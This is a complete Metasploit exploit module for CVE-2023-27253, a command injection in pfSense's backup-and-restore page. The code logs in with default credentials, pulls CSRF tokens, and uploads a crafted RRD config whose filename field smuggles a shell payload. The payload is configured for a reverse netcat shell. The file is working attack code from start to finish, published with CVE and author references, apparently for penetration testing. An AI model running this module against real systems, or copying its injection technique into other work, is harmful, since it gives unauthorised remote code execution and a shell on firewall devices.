class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'pfSense Restore RRD Data Command Injection',
        'Description' => %q{
          This module exploits an OS Command Injection vulnerability in the pfSense
          Config Module (CVE-2023-27253). The vulnerability affects versions <= 2.7.0
          and can be exploited by an authenticated user if they have the
          "WebCfg - Diagnostics: Backup & Restore" privilege.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Emir Polat', # vulnerability discovery & metasploit module
        ],
        'References' => [
          ['CVE', '2023-27253'],
          ['URL', 'https://redmine.pfsense.org/issues/13935']
        ],
        'DisclosureDate' => '2023-03-18',
        'Platform' => ['unix'],
        'Arch'           => [ ARCH_CMD ],
        'Privileged' => true,
        'Targets'        =>
          [
            [ 'Automatic Target', {}]
          ],
        'Payload'        =>
          {
            'Space'       => 1024,
            'BadChars'    => "\x2F\x27",
            'DisableNops' => true,
            'Compat'      =>
              {
                'PayloadType' => 'cmd',
                'RequiredCmd' => 'reverse netcat'
              }
          },
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'DefaultTarget' => 0
      )
    )

    register_options [
                       OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
                       OptString.new('PASSWORD', [true, 'Password to authenticate with', 'pfsense'])
                     ]

  end


  def check
    csrf = get_csrf('index.php', nil, 'GET')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path + 'index.php'),
      'method' => 'POST',
      'vars_post' => {
        '__csrf_magic' => csrf,
        'usernamefld' => datastore['USERNAME'],
        'passwordfld' => datastore['PASSWORD'],
        'login' => ''
      }
    )

    @auth_cookies = res.get_cookies

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path + 'diag_backup.php'),
      'method' => 'GET',
      'cookie' => @auth_cookies
    )

    /Diagnostics: (?<backup>)/m =~ res.body
    if backup and detect_version() != '2.7.0-RELEASE'
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def detect_version
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET',
      'cookie' => @auth_cookies
    )

    /Version.+<strong>(?<version>[0-9\.\-RELEASE]+)[\n]?<\/strong>/m =~ res.body

    return version
  end

  def get_csrf(uri, cookies, methods)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path + uri),
      'method' => methods,
      'cookie' => cookies
    )

    /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body

    return csrf
  end

  def drop_config
    csrf = get_csrf('diag_backup.php', @auth_cookies, 'GET')

    post_data = Rex::MIME::Message.new

    post_data.add_part(csrf, nil, nil, "form-data; name=\"__csrf_magic\"")
    post_data.add_part("rrddata", nil, nil, "form-data; name=\"backuparea\"")
    post_data.add_part("", nil, nil, "form-data; name=\"encrypt_password\"")
    post_data.add_part("", nil, nil, "form-data; name=\"encrypt_password_confirm\"")
    post_data.add_part("Download configuration as XML", nil, nil, "form-data; name=\"download\"")
    post_data.add_part("", nil, nil, "form-data; name=\"restorearea\"")
    post_data.add_part("", "application/octet-stream", nil, "form-data; name=\"conffile\"")
    post_data.add_part("", nil, nil, "form-data; name=\"decrypt_password\"")



    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path + 'diag_backup.php'),
      'method' => 'POST',
      'cookie' => @auth_cookies,
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    )

    return res.body
  end

  def exploit
    csrf = get_csrf('diag_backup.php', @auth_cookies, 'GET')

    config_data = drop_config()
    /<filename>(?<file>.*?)<\/filename>/ =~ config_data
    config_data.gsub(" ", "${IFS}")
    send_p = config_data.gsub(file, "WAN_DHCP-quality.rrd';#{payload.encoded};")

    post_data = Rex::MIME::Message.new

    post_data.add_part(csrf, nil, nil, "form-data; name=\"__csrf_magic\"")
    post_data.add_part("", nil, nil, "form-data; name=\"backuparea\"")
    post_data.add_part("yes", nil, nil, "form-data; name=\"donotbackuprrd\"")
    post_data.add_part("yes", nil, nil, "form-data; name=\"backupssh\"")
    post_data.add_part("", nil, nil, "form-data; name=\"encrypt_password\"")
    post_data.add_part("", nil, nil, "form-data; name=\"encrypt_password_confirm\"")
    post_data.add_part("rrddata", nil, nil, "form-data; name=\"restorearea\"")
    post_data.add_part("#{send_p}", "text/xml", nil, "form-data; name=\"conffile\"; filename=\"rrddata-config-pfSense.home.arpa-#{rand_text_alphanumeric(14)}.xml\"")
    post_data.add_part("", nil, nil, "form-data; name=\"decrypt_password\"")
    post_data.add_part("Restore Configuration", nil, nil, "form-data; name=\"restore\"")

    send_request_cgi(
      'uri' => normalize_uri(target_uri.path + 'diag_backup.php'),
      'method' => 'POST',
      'cookie' => @auth_cookies,
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    )

  end
end
